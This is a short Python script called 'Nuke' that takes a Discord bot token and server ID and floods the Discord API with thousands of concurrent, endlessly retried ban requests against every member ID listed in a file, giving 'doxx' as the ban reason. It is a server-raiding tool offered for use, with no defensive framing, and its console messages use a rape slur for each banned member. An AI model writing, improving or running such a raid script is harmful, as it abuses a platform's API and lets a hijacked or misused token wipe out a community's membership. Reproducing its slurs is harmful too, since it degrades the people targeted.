import aiohttp, asyncio, random, os
os.system("pip install tasksio")
import tasksio 
from itertools import cycle 

class Nuke:
  def __init__(self):
    self.token = input("hy")
    self.guild = input("hy")

    self.lol = input("lol")
    self.proxies = []
    self.tasks = 3333
    self.ban_reason = "doxx"
    self.headers = {"Authorization": "Bot {}".format(self.token)}
    self.apii = random.randint(7, 8);
    self.api = random.randint(8, 9);
    
    

  async def ban_execute(self, members):
    try:
        async with aiohttp.ClientSession(headers=self.headers) as session:
            async with session.put(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/bans/{members}?reason={self.ban_reason}") as response:
              if response.status == 200 or response.status == 201 or response.status == 204:
                  print(f"Succesfully Raped -> {members}")
              else:
                  print(f"Failed To Rape ->  {members}")
              return await self.ban_execute(members)
    except Exception:
        print(f"not working")
        return await self.ban_execute(members)

  async def start(self):
    async with tasksio.TaskPool(self.tasks) as pool:
      while True:
        for member in open("M.txt").read().splitlines():
          await pool.put(self.ban_execute(member))     
     
if __name__ == "__main__":
    client = Nuke()
    asyncio.get_event_loop().run_until_complete(client.start())
